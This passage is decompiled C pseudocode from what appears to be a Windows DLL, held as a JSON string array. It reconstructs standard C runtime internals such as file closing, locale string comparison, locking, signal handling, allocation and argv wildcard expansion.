    "  {",
    "    if ( (Stream->_flag & 0x40) != 0 && (Stream->_flag & 0x100) == 0 )",
    "      Stream->_bufsiz = 4096;",
    "    v8 = Stream;",
    "  }",
    "  ptr = v8->_ptr;",
    "  --v8->_base;",
    "  v10 = *ptr;",
    "  v8->_ptr = ptr + 1;",
    "  return v10;",
    "}",
    "",
    "",
    "int __cdecl sub_10023444(FILE *a1)",
    "{",
    "  return sub_100232B9(a1);",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_d422a76eb4c3bf3ad751449ab71a6ea4_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_9476263c8ee91a25d21c55370bdb50de_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3)",
    "{",
    "  int v3; // esi",
    "  int v4; // esi",
    "",
    "  __acrt_lowio_lock_fh(*a1);",
    "  v3 = *(_DWORD *)(a2 + 4);",
    "  if ( (*(_BYTE *)(&lpCriticalSection[**(int **)a2 >> 6][1].LockSemaphore + 14 * (**(_DWORD **)a2 & 0x3F)) & 1) != 0 )",
    "  {",
    "    v4 = _close_nolock_internal(**(_DWORD **)a2, *(_DWORD *)(a2 + 4));",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(v3 + 28) = 1;",
    "    *(_DWORD *)(v3 + 24) = 9;",
    "    v4 = -1;",
    "  }",
    "  __acrt_lowio_unlock_fh(*a3);",
    "  return v4;",
    "}",
    "",
    "",
    "int __cdecl sub_100234E0(int a1, __crt_cached_ptd_host *a2)",
    "{",
    "  __crt_cached_ptd_host *v2; // eax",
    "  __crt_cached_ptd_host *v4; // eax",
    "  struct __acrt_ptd **v5; // [esp-4h] [ebp-1Ch]",
    "  _DWORD v6[2]; // [esp+4h] [ebp-14h] BYREF",
    "  int v7; // [esp+Ch] [ebp-Ch] BYREF",
    "  int v8; // [esp+10h] [ebp-8h] BYREF",
    "",
    "  if ( a1 == -2 )",
    "  {",
    "    v2 = a2;",
    "    *((_DWORD *)a2 + 8) = 0;",
    "    *((_BYTE *)v2 + 36) = 1;",
    "    *((_BYTE *)v2 + 28) = 1;",
    "    *((_DWORD *)v2 + 6) = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( a1 >= 0",
    "      && a1 < (unsigned int)dword_10040590",
    "      && (*(_BYTE *)(&lpCriticalSection[a1 >> 6][1].LockSemaphore + 14 * (a1 & 0x3F)) & 1) != 0 )",
    "    {",
    "      v8 = a1;",
    "      v6[0] = &a1;",
    "      v6[1] = a2;",
    "      v7 = a1;",
    "      return __crt_seh_guarded_call<int>::operator()<_lambda_d422a76eb4c3bf3ad751449ab71a6ea4_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_9476263c8ee91a25d21c55370bdb50de_>(",
    "               &v7,",
    "               (int)v6,",
    "               &v8);",
    "    }",
    "    v4 = a2;",
    "    v5 = (struct __acrt_ptd **)a2;",
    "    *((_BYTE *)a2 + 36) = 1;",
    "    *((_DWORD *)v4 + 8) = 0;",
    "    *((_BYTE *)v4 + 28) = 1;",
    "    *((_DWORD *)v4 + 6) = 9;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, v5);",
    "  }",
    "  return -1;",
    "}",
    "",
    "",
    "int __cdecl _close_nolock(int FileHandle)",
    "{",
    "  int v1; // esi",
    "  int v3[10]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v3, 0);",
    "  v1 = _close_nolock_internal(FileHandle, (int)v3);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v3);",
    "  return v1;",
    "}",
    "",
    "",
    "int __cdecl _close_nolock_internal(int FileHandle, int a2)",
    "{",
    "  DWORD LastError; // esi",
    "  intptr_t osfhandle; // esi",
    "  void *v4; // eax",
    "",
    "  if ( _get_osfhandle(FileHandle) == -1",
    "    || (FileHandle == 1 && (lpCriticalSection[0][6].RecursionCount & 1) != 0",
    "     || FileHandle == 2 && ((int)lpCriticalSection[0][4].DebugInfo & 1) != 0)",
    "    && (osfhandle = _get_osfhandle(2), _get_osfhandle(1) == osfhandle)",
    "    || (v4 = (void *)_get_osfhandle(FileHandle), CloseHandle(v4)) )",
    "  {",
    "    LastError = 0;",
    "  }",
    "  else",
    "  {",
    "    LastError = GetLastError();",
    "  }",
    "  _free_osfhnd(FileHandle);",
    "  *((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + 56 * (FileHandle & 0x3F)) = 0;",
    "  if ( !LastError )",
    "    return 0;",
    "  __acrt_errno_map_os_error_ptd(LastError, a2);",
    "  return -1;",
    "}",
    "",
    "",
    "int __cdecl __acrt_stdio_free_buffer_nolock(int a1)",
    "{",
    "  volatile signed __int32 *v1; // edi",
    "  int result; // eax",
    "",
    "  v1 = (volatile signed __int32 *)(a1 + 12);",
    "  result = *(_DWORD *)(a1 + 12) >> 13;",
    "  if ( (*(_DWORD *)(a1 + 12) & 0x2000) != 0 )",
    "  {",
    "    result = (unsigned __int32)*v1 >> 6;",
    "    if ( (*v1 & 0x40) != 0 )",
    "    {",
    "      _free_base(*(void **)(a1 + 4));",
    "      _InterlockedAnd(v1, 0xFFFFFEBF);",
    "      result = 0;",
    "      *(_DWORD *)(a1 + 4) = 0;",
    "      *(_DWORD *)a1 = 0;",
    "      *(_DWORD *)(a1 + 8) = 0;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _strnicoll(const char *String1, const char *String2, size_t MaxCount)",
    "{",
    "  if ( dword_10040364 )",
    "    return _strnicoll_l(String1, String2, MaxCount, 0);",
    "  else",
    "    return _strnicmp(String1, String2, MaxCount);",
    "}",
    "",
    "",
    "int __cdecl _strnicoll_l(const char *String1, const char *String2, size_t MaxCount, _locale_t Locale)",
    "{",
    "  int v4; // esi",
    "  wchar_t *v5; // ebx",
    "  int v6; // eax",
    "  int v8; // [esp+Ch] [ebp-10h] BYREF",
    "  __crt_locale_pointers v9; // [esp+10h] [ebp-Ch] BYREF",
    "  char v10; // [esp+18h] [ebp-4h]",
    "",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v8, Locale);",
    "  if ( MaxCount )",
    "  {",
    "    if ( String1 && String2 )",
    "    {",
    "      v4 = 0x7FFFFFFF;",
    "      if ( MaxCount <= 0x7FFFFFFF )",
    "      {",
    "        v5 = (wchar_t *)*((_DWORD *)v9.locinfo + 41);",
    "        if ( v5 )",
    "        {",
    "          v6 = __acrt_CompareStringA(",
    "                 &v9,",
    "                 v5,",
    "                 0x1001u,",
    "                 (char *)String1,",
    "                 MaxCount,",
    "                 (char *)String2,",
    "                 MaxCount,",
    "                 *((_DWORD *)v9.locinfo + 4));",
    "          if ( v6 )",
    "            v4 = v6 - 2;",
    "          else",
    "            *(_DWORD *)sub_1001E025() = 22;",
    "        }",
    "        else",
    "        {",
    "          v4 = _strnicmp_l(String1, String2, MaxCount, &v9);",
    "        }",
    "      }",
    "      else",
    "      {",
    "        *(_DWORD *)sub_1001E025() = 22;",
    "        _invalid_parameter_noinfo();",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "      _invalid_parameter_noinfo();",
    "      v4 = 0x7FFFFFFF;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v4 = 0;",
    "  }",
    "  if ( v10 )",
    "    *(_DWORD *)(v8 + 848) &= ~2u;",
    "  return v4;",
    "}",
    "",
    "",
    "char sub_10023784()",
    "{",
    "  struct _RTL_CRITICAL_SECTION *v0; // edi",
    "  unsigned int v1; // esi",
    "",
    "  v0 = (struct _RTL_CRITICAL_SECTION *)&unk_100405F8;",
    "  v1 = 0;",
    "  while ( sub_10021DC3(v0, 0xFA0u, 0) )",
    "  {",
    "    ++dword_10040760;",
    "    v1 += 24;",
    "    ++v0;",
    "    if ( v1 >= 0x168 )",
    "      return 1;",
    "  }",
    "  __acrt_uninitialize_locks(0);",
    "  return 0;",
    "}",
    "",
    "",
    "void __cdecl __acrt_lock(int a1)",
    "{",
    "  EnterCriticalSection((LPCRITICAL_SECTION)&unk_100405F8 + a1);",
    "}",
    "",
    "",
    "char __acrt_uninitialize_locks()",
    "{",
    "  int v0; // esi",
    "  struct _RTL_CRITICAL_SECTION *v1; // edi",
    "",
    "  v0 = dword_10040760;",
    "  if ( dword_10040760 )",
    "  {",
    "    v1 = (struct _RTL_CRITICAL_SECTION *)((char *)&unk_100405E0 + 24 * dword_10040760);",
    "    do",
    "    {",
    "      DeleteCriticalSection(v1);",
    "      --dword_10040760;",
    "      --v1;",
    "      --v0;",
    "    }",
    "    while ( v0 );",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "void __cdecl __acrt_unlock(int a1)",
    "{",
    "  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_100405F8 + a1);",
    "}",
    "",
    "",
    "int __cdecl iswctype(wint_t C, wctype_t Type)",
    "{",
    "  WCHAR SrcStr; // [esp+4h] [ebp-8h] BYREF",
    "  WORD CharType; // [esp+8h] [ebp-4h] BYREF",
    "",
    "  if ( C == 0xFFFF )",
    "    return 0;",
    "  if ( C < 0x100u )",
    "    return Type & *((_WORD *)off_1003F3A8 + C);",
    "  SrcStr = C;",
    "  CharType = 0;",
    "  if ( !__acrt_GetStringTypeW(1u, &SrcStr, 1, &CharType) )",
    "    return 0;",
    "  else",
    "    return Type & CharType;",
    "}",
    "",
    "",
    "int __acrt_initialize_timeset()",
    "{",
    "  int result; // eax",
    "",
    "  dword_10040764 = 28800;",
    "  result = 0;",
    "  dword_10040768 = 1;",
    "  dword_1004076C = -3600;",
    "  dword_10040770 = (int)&off_1003F530;",
    "  dword_10040774 = (int)off_1003F538;",
    "  return result;",
    "}",
    "",
    "",
    "unsigned int __cdecl filter_wcstomb_flags(unsigned int a1, unsigned int a2)",
    "{",
    "  bool v2; // zf",
    "  bool v3; // zf",
    "  int v4; // eax",
    "",
    "  if ( a1 > 0xDEAC )",
    "  {",
    "    if ( a1 > 0xDEB1 )",
    "    {",
    "      if ( a1 == 57010 || a1 == 57011 )",
    "        return 0;",
    "      v4 = a1 - 65000;",
    "      v3 = a1 == 65000;",
    "    }",
    "    else",
    "    {",
    "      if ( a1 == 57009 || a1 == 57005 || a1 == 57006 )",
    "        return 0;",
    "      v4 = a1 - 57007;",
    "      v3 = a1 == 57007;",
    "    }",
    "LABEL_21:",
    "    if ( v3 )",
    "      return 0;",
    "    v2 = v4 == 1;",
    "    goto LABEL_23;",
    "  }",
    "  if ( a1 == 57004 )",
    "    return 0;",
    "  if ( a1 > 0xC433 )",
    "  {",
    "    if ( a1 == 50229 || a1 == 54936 )",
    "      return 0;",
    "    v4 = a1 - 57002;",
    "    v3 = a1 == 57002;",
    "    goto LABEL_21;",
    "  }",
    "  if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )",
    "    return 0;",
    "  v2 = a1 == 50225;",
    "LABEL_23:",
    "  if ( !v2 )",
    "    return a2 & 0xFFFFFF7F;",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_10023952(",
    "        unsigned int a1,",
    "        unsigned int a2,",
    "        LPCWCH lpWideCharStr,",
    "        int cchWideChar,",
    "        LPSTR lpMultiByteStr,",
    "        int cbMultiByte,",
    "        const CHAR *a7,",
    "        BOOL *a8)",
    "{",
    "  bool v8; // bl",
    "  DWORD v9; // eax",
    "  UINT v10; // edx",
    "  BOOL *v11; // esi",
    "",
    "  v8 = a1 == 65000 || a1 == 65001;",
    "  v9 = filter_wcstomb_flags(a1, a2);",
    "  v11 = a8;",
    "  if ( v8 )",
    "    v11 = 0;",
    "  if ( v8 )",
    "  {",
    "    a7 = 0;",
    "    if ( a8 )",
    "      *a8 = 0;",
    "  }",
    "  return WideCharToMultiByte(v10, v9, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, a7, v11);",
    "}",
    "",
    "",
    "void __cdecl _freea_crt(int a1)",
    "{",
    "  if ( a1 )",
    "  {",
    "    if ( *(_DWORD *)(a1 - 8) == 56797 )",
    "      _free_base((void *)(a1 - 8));",
    "  }",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_cbab9ec6f41b0180b23cc171c22676b0_,_lambda_44731a7d0e6d81c3e6aa82d741081786_ &,_lambda_4b292cb8dd18144e164572427af410ab_>(",
    "        int *a1,",
    "        int a2,",
    "        int *a3)",
    "{",
    "  int v4; // [esp+10h] [ebp-1Ch]",
    "",
    "  __acrt_lock(*a1);",
    "  v4 = __ROR4__(__security_cookie ^ dword_10040834, __security_cookie & 0x1F);",
    "  __acrt_unlock(*a3);",
    "  return v4;",
    "}",
    "",
    "",
    "void (__cdecl **__cdecl get_global_action_nolock(int a1))(int)",
    "{",
    "  if ( a1 == 2 )",
    "    return (void (__cdecl **)(int))&dword_1004082C;",
    "  if ( a1 != 6 )",
    "  {",
    "    if ( a1 == 15 )",
    "      return (void (__cdecl **)(int))&dword_10040838;",
    "    if ( a1 == 21 )",
    "      return (void (__cdecl **)(int))&dword_10040830;",
    "    if ( a1 != 22 )",
    "      return 0;",
    "  }",
    "  return (void (__cdecl **)(int))&dword_10040834;",
    "}",
    "",
    "",
    "struct __crt_signal_action_t *__cdecl siglookup(int a1, struct __crt_signal_action_t *const a2)",
    "{",
    "  struct __crt_signal_action_t *result; // eax",
    "",
    "  result = a2;",
    "  while ( *((_DWORD *)result + 1) != a1 )",
    "  {",
    "    result = (struct __crt_signal_action_t *)((char *)result + 12);",
    "    if ( result == (struct __crt_signal_action_t *const)((char *)a2 + 144) )",
    "      return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __acrt_get_sigabrt_handler()",
    "{",
    "  int v1; // [esp+0h] [ebp-Ch] BYREF",
    "  int v2; // [esp+4h] [ebp-8h] BYREF",
    "  char v3; // [esp+Bh] [ebp-1h] BYREF",
    "",
    "  v2 = 3;",
    "  v1 = 3;",
    "  return __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_cbab9ec6f41b0180b23cc171c22676b0_,_lambda_44731a7d0e6d81c3e6aa82d741081786_ &,_lambda_4b292cb8dd18144e164572427af410ab_>(",
    "           &v1,",
    "           (int)&v3,",
    "           &v2);",
    "}",
    "",
    "",
    "int __cdecl __acrt_initialize_signal_handlers(int a1)",
    "{",
    "  int result; // eax",
    "",
    "  result = a1;",
    "  dword_1004082C = a1;",
    "  dword_10040830 = a1;",
    "  dword_10040834 = a1;",
    "  dword_10040838 = a1;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl raise(int Signal)",
    "{",
    "  struct __acrt_ptd *v1; // edi",
    "  char v2; // bl",
    "  struct __acrt_ptd *v3; // eax",
    "  struct __crt_signal_action_t *v5; // eax",
    "  void (__cdecl **global_action_nolock)(int); // eax",
    "  int v7; // ecx",
    "  bool v8; // bh",
    "  int v9; // eax",
    "  int v10; // edx",
    "  int v11; // eax",
    "  int v12; // [esp+14h] [ebp-34h]",
    "  int v13; // [esp+18h] [ebp-30h]",
    "  int *v14; // [esp+24h] [ebp-24h]",
    "  void (__cdecl *v15)(_DWORD); // [esp+28h] [ebp-20h]",
    "",
    "  v1 = 0;",
    "  v12 = 0;",
    "  v2 = 1;",
    "  if ( Signal > 11 )",
    "  {",
    "    if ( Signal != 15 && Signal != 21 && Signal != 22 )",
    "      goto LABEL_10;",
    "    goto LABEL_15;",
    "  }",
    "  if ( Signal != 11 )",
    "  {",
    "    if ( Signal == 2 )",
    "      goto LABEL_15;",
    "    if ( Signal != 4 )",
    "    {",
    "      if ( Signal != 6 )",
    "      {",
    "        if ( Signal != 8 )",
    "          goto LABEL_10;",
    "        goto LABEL_7;",
    "      }",
    "LABEL_15:",
    "      global_action_nolock = get_global_action_nolock(Signal);",
    "      goto LABEL_16;",
    "    }",
    "  }",
    "LABEL_7:",
    "  v3 = sub_1001FFFD();",
    "  v1 = v3;",
    "  if ( !v3 )",
    "    return -1;",
    "  v5 = siglookup(Signal, *(struct __crt_signal_action_t *const *)v3);",
    "  if ( !v5 )",
    "  {",
    "LABEL_10:",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return -1;",
    "  }",
    "  global_action_nolock = (void (__cdecl **)(int))((char *)v5 + 8);",
    "  v2 = 0;",
    "LABEL_16:",
    "  v14 = (int *)global_action_nolock;",
    "  v13 = 0;",
    "  if ( v2 )",
    "    __acrt_lock(3);",
    "  v7 = *v14;",
    "  v15 = (void (__cdecl *)(_DWORD))*v14;",
    "  if ( v2 )",
    "  {",
    "    v7 = unknown_libname_22(v7);",
    "    v15 = (void (__cdecl *)(_DWORD))v7;",
    "  }",
    "  v8 = v7 == 1;",
    "  if ( v7 == 1 )",
    "    goto LABEL_36;",
    "  if ( !v7 )",
    "  {",
    "    if ( v2 )",
    "      __acrt_unlock(3);",
    "    _exit(3);",
    "  }",
    "  if ( Signal == 8 || Signal == 11 || Signal == 4 )",
    "  {",
    "    v13 = *((_DWORD *)v1 + 1);",
    "    *((_DWORD *)v1 + 1) = 0;",
    "    if ( Signal != 8 )",
    "      goto LABEL_31;",
    "    v12 = *(_DWORD *)(sub_1001FFAC() + 8);",
    "    *(_DWORD *)(sub_1001FFAC() + 8) = 140;",
    "  }",
    "  if ( Signal == 8 )",
    "  {",
    "    v9 = *(_DWORD *)v1 + 36;",
    "    v10 = *(_DWORD *)v1 + 144;",
    "    while ( v9 != v10 )",
    "    {",
    "      *(_DWORD *)(v9 + 8) = 0;",
    "      v9 += 12;",
    "    }",
    "    goto LABEL_36;",
    "  }",
    "LABEL_31:",
    "  *v14 = __security_cookie;",
    "LABEL_36:",
    "  if ( v2 )",
    "    __acrt_unlock(3);",
    "  if ( !v8 )",
    "  {",
    "    if ( Signal == 8 )",
    "    {",
    "      v11 = sub_1001FFAC();",
    "      ((void (__cdecl *)(int, _DWORD))v15)(8, *(_DWORD *)(v11 + 8));",
    "    }",
    "    else",
    "    {",
    "      v15(Signal);",
    "    }",
    "    if ( Signal == 8 || Signal == 11 || Signal == 4 )",
    "    {",
    "      *((_DWORD *)v1 + 1) = v13;",
    "      if ( Signal == 8 )",
    "        *(_DWORD *)(sub_1001FFAC() + 8) = v12;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "LPVOID __cdecl sub_10023CF0(unsigned int a1, unsigned int a2)",
    "{",
    "  SIZE_T v2; // esi",
    "  LPVOID result; // eax",
    "",
    "  if ( a1 && 0xFFFFFFE0 / a1 < a2 )",
    "  {",
    "LABEL_10:",
    "    *(_DWORD *)sub_1001E025() = 12;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    v2 = a2 * a1;",
    "    if ( !(a2 * a1) )",
    "      v2 = 1;",
    "    while ( 1 )",
    "    {",
    "      result = HeapAlloc(hHeap, 8u, v2);",
    "      if ( result )",
    "        break;",
    "      if ( !sub_10025B20() || !_callnewh(v2) )",
    "        goto LABEL_10;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _fcloseall()",
    "{",
    "  int i; // esi",
    "  int v1; // eax",
    "  int v3; // [esp+14h] [ebp-1Ch]",
    "",
    "  v3 = 0;",
    "  __acrt_lock(8);",
    "  for ( i = 3; i != dword_10040214; ++i )",
    "  {",
    "    v1 = *((_DWORD *)Block + i);",
    "    if ( v1 )",
    "    {",
    "      if ( (*(_DWORD *)(v1 + 12) & 0x2000) != 0 && fclose(*((FILE **)Block + i)) != -1 )",
    "        ++v3;",
    "      DeleteCriticalSection((LPCRITICAL_SECTION)(*((_DWORD *)Block + i) + 32));",
    "      _free_base(*((void **)Block + i));",
    "      *((_DWORD *)Block + i) = 0;",
    "    }",
    "  }",
    "  __acrt_unlock(8);",
    "  return v3;",
    "}",
    "",
    "",
    "char __acrt_app_verifier_enabled()",
    "{",
    "  return BYTE1(NtCurrentTeb()->ProcessEnvironmentBlock->NtGlobalFlag) & 1;",
    "}",
    "",
    "",
    "unsigned int __acrt_is_secure_process()",
    "{",
    "  return NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Flags >> 31;",
    "}",
    "",
    "",
    "BOOL __acrt_get_process_end_policy()",
    "{",
    "  int v1; // [esp+0h] [ebp-4h] BYREF",
    "",
    "  v1 = 0;",
    "  if ( !(unsigned __int8)__acrt_is_secure_process() )",
    "    sub_10021CBB((int)&v1);",
    "  return v1 != 1;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "int __cdecl unknown_libname_27(unsigned int a1, unsigned int a2)",
    "{",
    "}int __cdecl sub_10023E5F(LPCWCH lpWideCharStr, int a2, int a3, unsigned int a4)",
    "{",
    "  int v4; // esi",
    "  int result; // eax",
    "  unsigned int v6; // eax",
    "  DWORD v7; // eax",
    "  int v8; // eax",
    "  DWORD LastError; // eax",
    "",
    "  if ( !lpWideCharStr )",
    "  {",
    "    v4 = a2;",
    "    unknown_libname_19(a2);",
    "    *(_DWORD *)(a2 + 8) = 0;",
    "    *(_DWORD *)(a2 + 12) = 0;",
    "LABEL_3:",
    "    *(_DWORD *)(v4 + 16) = 0;",
    "    return 0;",
    "  }",
    "  if ( *lpWideCharStr )",
    "  {",
    "    v6 = sub_10023952(a4, 0, lpWideCharStr, -1, 0, 0, 0, 0);",
    "    if ( v6 )",
    "    {",
    "      if ( v6 <= *(_DWORD *)(a2 + 12) || (result = sub_10024404(v6)) == 0 )",
    "      {",
    "        v8 = unknown_libname_20(a4, lpWideCharStr, *(LPSTR *)(a2 + 8), *(_DWORD *)(a2 + 12));",
    "        if ( v8 )",
    "        {",
    "          *(_DWORD *)(a2 + 16) = v8 - 1;",
    "          return 0;",
    "        }",
    "        else",
    "        {",
    "          LastError = GetLastError();",
    "          __acrt_errno_map_os_error(LastError);",
    "          return *(_DWORD *)sub_1001E025();",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v7 = GetLastError();",
    "      __acrt_errno_map_os_error(v7);",
    "      return *(_DWORD *)sub_1001E025();",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v4 = a2;",
    "    if ( *(_DWORD *)(a2 + 12) || (result = sub_10024404(1)) == 0 )",
    "    {",
    "      **(_BYTE **)(a2 + 8) = 0;",
    "      goto LABEL_3;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl common_expand_argv_wildcards<char>(unsigned __int8 **a1, int *a2)",
    "{",
    "  const char **v3; // ecx",
    "  unsigned __int8 **v4; // ebx",
    "  const char **v5; // edi",
    "  unsigned __int8 *v6; // eax",
    "  unsigned __int8 *v7; // eax",
    "  int v8; // esi",
    "  int v9; // eax",
    "  const char **v10; // esi",
    "  int v11; // ebx",
    "  unsigned int v12; // eax",
    "  const char *v13; // edx",
    "  int buffer_for_argv; // eax",
    "  int v15; // esi",
    "  int v16; // eax",
    "  const char **v17; // ebx",
    "  const char *v18; // edx",
    "  const char *v19; // ecx",
    "  const char *v20; // edx",
    "  const char *v21; // [esp-10h] [ebp-34h]",
    "  int v22; // [esp+4h] [ebp-20h] BYREF",
    "  const char **v23; // [esp+8h] [ebp-1Ch]",
    "  int v24; // [esp+Ch] [ebp-18h]",
    "  int v25; // [esp+10h] [ebp-14h]",
    "  int v26; // [esp+14h] [ebp-10h]",
    "  int v27; // [esp+18h] [ebp-Ch]",
    "  unsigned int v28; // [esp+1Ch] [ebp-8h]",
    "  char Control[4]; // [esp+20h] [ebp-4h] BYREF",
    "",
    "  if ( a2 )",
    "  {",
    "    *a2 = 0;",
    "    v3 = 0;",
    "    v24 = 0;",
    "    v4 = a1;",
    "    v5 = 0;",
    "    v23 = 0;",
    "    v22 = 0;",
    "    v6 = *a1;",
    "    if ( *a1 )",
    "    {",
    "      while ( 1 )",
    "      {",
    "        strcpy(Control, \"*?\");",
    "        v7 = (unsigned __int8 *)strpbrk((const char *)v6, Control);",
    "        if ( v7 )",
    "        {",
    "          v9 = sub_10024153(*v4, v7, (int)&v22);",
    "          if ( v9 )",
    "          {",
    "            v8 = v9;",
    "            goto LABEL_16;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v8 = copy_and_add_argument_to_buffer<char>(*v4, 0, 0, &v22);",
    "          if ( v8 )",
    "            goto LABEL_16;",
    "        }",
    "        v6 = *++v4;",
    "        if ( !*v4 )",
    "        {",
    "          v5 = (const char **)v22;",
    "          v3 = v23;",
    "          break;",
    "        }",
    "      }",
    "    }",
    "    v10 = v5;",
    "    v11 = v3 - v5 + 1;",
    "    v12 = 0;",
    "    while ( 1 )",
    "    {",
    "      v28 = v12;",
    "      if ( v10 == v3 )",
    "        break;",
    "      v13 = *v10;",
    "      v27 = (int)(*v10 + 1);",
    "      v12 = (unsigned int)&v13[strlen(v13) + 1 - v27 + 1 + v28];",
    "      ++v10;",
    "    }",
    "    buffer_for_argv = __acrt_allocate_buffer_for_argv(v3 - v5 + 1, v12, 1u);",
    "    v15 = buffer_for_argv;",
    "    if ( buffer_for_argv )",
    "    {",
    "      v16 = buffer_for_argv + 4 * v11;",
    "      v17 = v23;",
    "      v26 = v16;",
    "      v18 = (const char *)v16;",
    "      *(_DWORD *)Control = v16;",
    "      if ( v5 != v23 )",
    "      {",
    "        v25 = v15 - (_DWORD)v5;",
    "        do",
    "        {",
    "          v19 = *v5;",
    "          v27 = (int)(*v5 + 1);",
    "          v21 = *v5;",
    "          v27 = (int)&v19[strlen(v19) + 1 - v27 + 1];",
    "          if ( sub_10029C77(v18, v28 + v26 - (_DWORD)v18, v21, v27) )",
    "            _invoke_watson(0, 0, 0, 0, 0);",
    "          v20 = *(const char **)Control;",
    "          *(const char **)((char *)v5++ + v25) = *(const char **)Control;",
    "          v18 = &v20[v27];",
    "          *(_DWORD *)Control = v18;",
    "        }",
    "        while ( v5 != v17 );",
    "      }",
    "      *a2 = v15;",
    "      _free_base(0);",
    "      unknown_libname_28(&v22);",
    "      return 0;",
    "    }",
    "    else",
    "    {",
    "      _free_base(0);",
    "      v8 = -1;",
    "LABEL_16:",
    "      unknown_libname_28(&v22);",
    "      return v8;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl copy_and_add_argument_to_buffer<char>(const char *a1, int a2, int a3, int a4)",
    "{",
    "  unsigned int v4; // ecx",
    "  unsigned int v6; // ebx",
    "  char *v7; // eax",
    "  char *v8; // esi",
    "  int v9; // esi",
    "  unsigned int v10; // [esp+0h] [ebp-4h]",
    "  int v11; // [esp+0h] [ebp-4h]",
    "",
    "  v4 = strlen(a1) + 1;",
    "  v10 = v4;",
    "  if ( v4 > ~a3 )",
    "    return 12;",
    "  v6 = v4 + a3 + 1;",
    "  v7 = (char *)sub_10023CF0(v6, 1u);",
    "  v8 = v7;",
    "  if ( a3 && sub_10029C77(v7, v6, a2, a3) || sub_10029C77(&v8[a3], v6 - a3, a1, v10) )",
    "    _invoke_watson(0, 0, 0, 0, 0);",
    "  v11 = unknown_libname_29(a4);",
    "  if ( v11 )",
    "  {",
    "    _free_base(v8);",
    "    v9 = v11;",
    "  }",
    "  else",
    "  {",
    "    **(_DWORD **)(a4 + 4) = v8;",
    "    v9 = 0;",
    "    *(_DWORD *)(a4 + 4) += 4;",
    "  }",
    "  _free_base(0);",
    "  return v9;",
    "}",
    "",
    "",
    "int __cdecl sub_10024153(unsigned __int8 *Start, unsigned __int8 *Pos, _DWORD *a3)",
    "{",
    "  unsigned __int8 *v3; // ecx",
    "  _DWORD *v4; // edx",
    "  unsigned __int8 v5; // al",
    "  unsigned __int8 v6; // al",
    "  char v8; // al",
    "  int v9; // ecx",
    "  int v10; // edx",
    "  UINT utf8_acp_compatibility_codepage; // eax",
    "  int v12; // eax",
    "  const WCHAR *v13; // ecx",
    "  HANDLE FirstFile; // esi",
    "  int v15; // esi",
    "  unsigned int v16; // eax",
    "  int v17; // eax",
    "  const char *v18; // ecx",
    "  char v19; // al",
    "  bool v20; // zf",
    "  int v21; // eax",
    "  int v22; // [esp+8h] [ebp-298h]",
    "  int v23; // [esp+Ch] [ebp-294h]",
    "  int v24; // [esp+10h] [ebp-290h]",
    "  int v25[2]; // [esp+14h] [ebp-28Ch] BYREF",
    "  void *Block; // [esp+1Ch] [ebp-284h]",
    "  int v27; // [esp+20h] [ebp-280h]",
    "  int v28; // [esp+24h] [ebp-27Ch]",
    "  char v29; // [esp+28h] [ebp-278h]",
    "  int v30[2]; // [esp+2Ch] [ebp-274h] BYREF",
    "  void *v31; // [esp+34h] [ebp-26Ch]",
    "  int v32; // [esp+38h] [ebp-268h]",
    "  int v33; // [esp+3Ch] [ebp-264h]",
    "  char v34; // [esp+40h] [ebp-260h]",
    "  _DWORD *v35; // [esp+44h] [ebp-25Ch]",
    "  unsigned __int8 v36; // [esp+4Bh] [ebp-255h] BYREF",
    "  struct _WIN32_FIND_DATAW v37; // [esp+4Ch] [ebp-254h] BYREF",
    "",
    "  v3 = Pos;",
    "  v4 = a3;",
    "  v35 = a3;",
    "  if ( Pos != Start )",
    "  {",
    "    do",
    "    {",
    "      v5 = *v3;",
    "      if ( *v3 == 47 )",
    "        break;",
    "      if ( v5 == 92 )",
    "        break;",
    "      if ( v5 == 58 )",
    "        break;",
    "      v3 = _mbsdec(Start, v3);",
    "    }",
    "    while ( v3 != Start );",
    "    v4 = v35;",
    "  }",
    "  v6 = *v3;",
    "  v36 = v6;",
    "  if ( v6 == 58 )",
    "  {",
    "    if ( v3 != Start + 1 )",
